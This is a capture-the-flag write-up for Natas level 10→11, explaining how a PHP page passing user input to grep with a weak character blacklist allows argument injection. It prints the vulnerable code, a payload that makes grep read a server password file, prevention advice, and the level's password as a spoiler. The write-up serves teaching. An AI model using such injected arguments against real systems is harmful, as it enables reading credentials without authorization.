# Natas Level 10 → 11

## Objective

Find the password for the next level.

---

## Enumeration

* Reviewed the webpage source code.
* Analyzed how user input was processed.
* Observed that the application filtered the characters `;`, `|`, and `&`.
* Examined the command executed by the server.

---

## Source Code Analysis

The application executed a command similar to:

```php
passthru("grep -i $key dictionary.txt");
```

Before executing the command, the following filter was applied:

```php
if (preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
}
```

The developer attempted to prevent command injection by blacklisting three shell metacharacters.

---

## Observation

Although command separators were blocked, user input was still inserted directly into the `grep` command.

Since spaces were not filtered, additional command-line arguments could still be supplied to `grep`.

---

## Vulnerability

### Argument Injection

Instead of executing a second shell command, it was possible to manipulate the arguments passed to `grep`.

Because the application trusted user input, an attacker could instruct `grep` to search additional files.

---

## Exploitation

### Payload Used

```text
. /etc/natas_webpass/natas11
```

### Why This Payload Works

The original command:

```bash
grep -i <user_input> dictionary.txt
```

became:

```bash
grep -i . /etc/natas_webpass/natas11 dictionary.txt
```

Explanation:

* `.` is a regular expression that matches any single character.
* `/etc/natas_webpass/natas11` becomes an additional file supplied to `grep`.
* `grep` searches both the password file and `dictionary.txt`.
* Since the password file contains a line matching `.`, its contents are printed.

No second shell command was executed.

Instead, the behavior of `grep` itself was manipulated.

---

## Result

The password for **Natas Level 11** was successfully retrieved from:

```text
/etc/natas_webpass/natas11
```

---

## Prevention

* Never construct shell commands using user input.
* Avoid blacklists as a security mechanism.
* Use language-native search functions instead of shell commands.
* Validate input using allowlists whenever possible.
* Escape shell arguments if shell execution is required.

---

## Key Takeaways

* Blacklisting a few special characters is not sufficient.
* Applications should not trust user-controlled command-line arguments.
* Understanding how a command works is often more valuable than searching for bypasses.
* Argument Injection is different from Command Injection but can be just as dangerous.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

</details>
